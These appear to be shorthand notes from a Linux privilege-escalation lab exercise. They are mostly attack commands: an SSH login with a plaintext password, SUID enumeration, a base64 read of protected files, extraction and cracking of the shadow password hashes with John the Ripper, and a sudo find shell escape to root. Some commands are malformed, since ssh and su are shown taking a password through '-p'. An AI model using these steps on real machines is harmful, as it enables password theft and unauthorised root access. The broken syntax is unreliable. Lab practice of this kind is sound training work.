target = "10.10.112.36"

ssh leonard@10.10.112.36 -p Penny123

uname -a 
> Linux ip-10-10-112-36 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

SUID binaries

Linpeas enumeration

> find / -perm -u=s -type f 2>/dev/null 
![img](./images/basic/img4.png)

> base64 "$LFILE" | base64 --decode

export shadow and password file

> unshadow passwd.txt shadow.txt > cracked.txt

> john --wordlist=/usr/share/wordlists/rockyou.txt  cracked.txt
![image](./images/basic/img5.png)

> su missy -p Password1
sudo binaries

![image](./images/basic/img6.png)
> sudo find . -exec /bin/sh \; -quit

![img](./images/basic/img7.png)